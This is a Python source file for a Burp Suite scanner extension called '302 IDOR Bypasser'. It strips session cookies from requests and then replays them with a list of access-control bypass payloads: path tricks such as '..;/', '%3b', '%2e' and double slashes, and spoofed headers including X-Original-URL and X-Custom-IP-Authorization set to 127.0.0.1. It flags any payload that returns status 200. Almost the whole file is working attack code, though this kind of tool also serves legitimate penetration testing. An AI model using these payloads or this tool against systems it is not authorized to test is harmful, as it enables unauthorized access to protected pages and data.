from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue
from java.io import PrintWriter
from array import array

class BurpExtender(IBurpExtender, IScannerCheck):

    #
    # implement IBurpExtender
    #

    def registerExtenderCallbacks(self, callbacks):
        # keep a reference to our callbacks object
        self._callbacks = callbacks

        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()

        # set our extension name
        callbacks.setExtensionName("302 IDOR Bypasser")
        self.stdout = PrintWriter(callbacks.getStdout(), True)
        self.stderr = PrintWriter(callbacks.getStderr(), True)

        # register ourselves as a custom scanner check
        callbacks.registerScannerCheck(self)

    # helper method to search a response for occurrences of a literal match string
    # and return a list of start/end offsets

    def _get_matches(self, sttcode):
        #response = self._helpers.bytesToString(response)
        if sttcode == 200:
            return True
        return False

    def doPassiveScan(self, baseRequestResponse):
        
        # look for matches of our passive check grep string
        matches = self._get_matches(self._helpers.analyzeResponse(baseRequestResponse.getResponse()).getStatusCode())
        if matches == False:
            return None
        
        OldReq = self._helpers.bytesToString(baseRequestResponse.getRequest())
        OldReq1 = OldReq.replace("Cookie: ", "text: ")
        checkRequestcode1 = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(OldReq1))
        STT1_CODE = self._helpers.analyzeResponse(checkRequestcode1.getResponse()).getStatusCode()
        if STT1_CODE == 200 or STT1_CODE == 400 or STT1_CODE == 500 or STT1_CODE == 503 :
            return None

        Rurl = self._helpers.analyzeRequest(baseRequestResponse).getUrl().getPath().rstrip("/")

        PreviousPath = '/'.join(str(Rurl).split('/')[:-1])
        LastPath = str(Rurl).split('/')[-1]
        self.stdout.println("Scanning: "+Rurl)


        payloads = ["aaa/../"+LastPath,"%3b"+LastPath,"%3b/"+LastPath,"//"+LastPath,"%2e/"+LastPath, LastPath+"/.", "./"+LastPath+"/./", LastPath+"%20/", "%20"+LastPath+"%20/", LastPath+"..;/", "img/..;/"+LastPath,"js/..;/"+LastPath,";/"+LastPath,LastPath+"/",LastPath+".json",LastPath+"#",LastPath+"%20",LastPath+";", LastPath+"..;", LastPath+".", LastPath+"%20/","scripts/..;/"+LastPath,"static/..;/"+LastPath]
        payloads1 = ["/aaa/.."+Rurl,"/."+Rurl,Rurl+"/%3b/",Rurl+"/~","/%2e"+Rurl,  "/."+Rurl+"/./",  "/img/..;"+Rurl,"/;"+Rurl,"/js/..;"+Rurl,"/scripts/..;"+Rurl,"/static/..;"+Rurl,"/;"+Rurl,"/%20"+Rurl,]
        hpayloads = ["X-Rewrite-URL: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1", "X-Original-URL: /"+LastPath]
        results = []

        for p in payloads:
            NewReq = OldReq1.replace(Rurl, PreviousPath+"/"+p)
            
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))

            STT_CODE = self._helpers.analyzeResponse(checkRequestResponse.getResponse()).getStatusCode()
            if STT_CODE == 200:
                results.append("Url payload: "+self._helpers.analyzeRequest(checkRequestResponse).getUrl().getPath() + " | Status code: "+str(STT_CODE))
                
            

        for hp in hpayloads:
            NewReq = OldReq1.replace("User-Agent: ", hp+"\r\n"+"User-Agent: ")
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))
            STT_CODE = self._helpers.analyzeResponse(checkRequestResponse.getResponse()).getStatusCode()
            if STT_CODE == 200:
                results.append("Header payload: "+hp + " | Status code: "+str(STT_CODE))

        for p1 in payloads1:
            NewReq = OldReq1.replace(Rurl, p1)
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))

            STT_CODE = self._helpers.analyzeResponse(checkRequestResponse.getResponse()).getStatusCode()
            if STT_CODE == 200:
                results.append("Url payload: "+self._helpers.analyzeRequest(checkRequestResponse).getUrl().getPath() + " | Status code: "+str(STT_CODE))
        
        if len(results) == 0:
            return None

        return [CustomScanIssue(
            baseRequestResponse.getHttpService(),
            self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
            [self._callbacks.applyMarkers(baseRequestResponse, None, None)],
            "302 IDOR Bypass Vuln",
            '<br>'.join(results),
            "High")]
        
        

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        # This method is called when multiple issues are reported for the same URL 
        # path by the same extension-provided check. The value we return from this 
        # method determines how/whether Burp consolidates the multiple issues
        # to prevent duplication
        #
        # Since the issue name is sufficient to identify our issues as different,
        # if both issues have the same name, only report the existing issue
        # otherwise report both issues
        if existingIssue.getUrl() == newIssue.getUrl():
            return -1

        return 0

#
# class implementing IScanIssue to hold our custom scan issue details
#
class CustomScanIssue (IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        pass

    def getRemediationBackground(self):
        pass

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        pass

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
